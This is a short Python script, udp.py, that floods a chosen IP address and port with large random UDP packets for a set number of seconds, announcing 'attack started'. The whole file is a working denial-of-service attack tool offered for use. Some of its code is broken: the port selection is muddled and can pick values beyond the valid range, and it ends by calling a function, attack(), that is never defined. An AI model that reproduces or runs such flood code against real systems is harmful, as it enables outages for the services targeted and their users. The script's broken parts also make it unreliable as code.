#!/usr/bin/python

import random
import socket
import sys
import time

if len(sys.argv) == 1:
    sys.exit('Usage: udp.py ip port length')


def udp():
    ip = sys.argv[1]
    port = int(sys.argv[2])
    dur = int(sys.argv[3])
    randport = (True, False)[port == 0]
    clock = (lambda: 0, time.process_time)[dur > 0]
    duration = (1, (clock() + dur))[dur > 0]
    print("attack started")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(35000)
    t_end = time.time() + dur

    while True:
        port = (random.randint(1, 15000000), port)[randport]
        while time.time() < t_end:
            try:
                sock.sendto(bytes, (ip, port))
            except KeyboardInterrupt:
                print("Bye")
                sys.exit()
        else:
            break

    attack('Attack Finished.')


udp()
